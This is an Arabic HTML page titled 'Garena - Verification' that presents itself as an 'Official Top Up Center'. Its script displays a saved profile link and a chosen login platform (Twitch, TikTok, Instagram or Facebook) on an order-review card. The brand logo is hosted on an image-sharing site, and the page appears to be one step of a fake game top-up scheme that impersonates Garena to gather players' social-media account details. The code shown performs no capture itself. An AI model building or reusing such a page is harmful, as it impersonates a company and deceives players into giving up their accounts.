<!DOCTYPE html>
<html lang="en" dir="rtl" class="notranslate" translate="no"> 
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="google" content="notranslate">
    <title>Garena - Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        :root { 
            --bg-body: #f4f7fa; 
            --card-bg: #ffffff;
            --border-gray: #e2e8f0; 
            --text-main: #0f172a;
            --primary-blue: #2563eb;
        }

        body { 
            margin: 0; padding: 0; font-family: 'Inter', sans-serif; 
            background-color: var(--bg-body); display: flex; justify-content: center; 
        }

        .mobile-container { width: 100%; max-width: 480px; min-height: 100vh; display: flex; flex-direction: column; }

        header { 
            width: 100%; height: 65px; background-color: #fff; border-bottom: 1px solid var(--border-gray); 
            display: flex; align-items: center; justify-content: space-between; padding: 0 16px; box-sizing: border-box;
        }

        .brand-section { display: flex; align-items: center; }
        .logo-img { height: 26px; }
        .v-line { width: 1px; height: 20px; background-color: #cbd5e0; margin: 0 12px; }
        .title-box span { font-size: 10px; font-weight: 800; color: var(--text-main); display: block; }

        .order-section { padding: 20px 16px; animation: fadeInUp 0.5s ease-out; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .order-card { background: var(--card-bg); border-radius: 20px; padding: 24px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05); border: 1px solid #fff; }
        .card-header h2 { font-size: 18px; font-weight: 800; text-align: center; margin-bottom: 24px; }

        .data-item { background: #f8fafc; border: 1.5px solid #f1f5f9; border-radius: 16px; padding: 16px; margin-bottom: 16px; }
        .item-label { font-size: 11px; font-weight: 700; color: var(--primary-blue); margin-bottom: 10px; display: block; }
        .item-value { font-size: 14px; font-weight: 700; color: var(--text-main); word-break: break-all; }

        /* تنسيق صندوق الشعارات */
        .platform-display-box {
            display: flex;
            align-items: center;
            justify-content: center; /* لجعل الشعار في المنتصف */
            background: #fff;
            border: 1px solid #edf2f7;
            border-radius: 12px;
            height: 60px;
            margin-top: 5px;
        }

        .logo-display {
            height: 35px; /* حجم الشعار */
            width: auto;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <header>
            <div class="brand-section">
                <img src="https://i.postimg.cc/KvMWmkZw/servio.png" class="logo-img">
                <div class="v-line"></div>
                <div class="title-box"><span>Official Top Up</span><span>Center</span></div>
            </div>
        </header>

        <div class="order-section">
            <div class="order-card">
                <div class="card-header"><h2>مراجعة الطلب</h2></div>

                <div class="data-item">
                    <span class="item-label">رابط الملف الشخصي</span>
                    <div class="item-value" id="platform-link-val">---</div>
                </div>

                <div class="data-item">
                    <span class="item-label">منصة تسجيل الدخول المعتمدة</span>
                    <div class="platform-display-box">
                        <img id="platform-logo-img" src="" class="logo-display" style="display: none;">
                        <span id="no-data-text" style="font-size: 12px; color: #94a3b8;">جاري التعرف...</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // روابط الصور للشعارات كما في صورتك
        const logos = {
            twitch: "https://upload.wikimedia.org/wikipedia/commons/d/d3/Twitch_Glitch_Logo_Purple.svg",
            tiktok: "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg",
            instagram: "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
            facebook: "https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"
        };

        function updateUI() {
            const savedLink = localStorage.getItem('saved_player_link') || '---';
            const savedPlatform = localStorage.getItem('saved_platform_name') || '';

            document.getElementById('platform-link-val').innerText = savedLink;

            const logoImg = document.getElementById('platform-logo-img');
            const noDataText = document.getElementById('no-data-text');
            const platformKey = savedPlatform.toLowerCase();

            let foundLogo = "";
            if (platformKey.includes('twitch')) foundLogo = logos.twitch;
            else if (platformKey.includes('tiktok')) foundLogo = logos.tiktok;
            else if (platformKey.includes('instagram')) foundLogo = logos.instagram;
            else if (platformKey.includes('facebook')) foundLogo = logos.facebook;

            if (foundLogo) {
                logoImg.src = foundLogo;
                logoImg.style.display = "block";
                noDataText.style.display = "none";
            } else {
                logoImg.style.display = "none";
                noDataText.innerText = "غير محدد";
            }
        }

        document.addEventListener('DOMContentLoaded', updateUI);
    </script>
</body>
</html>
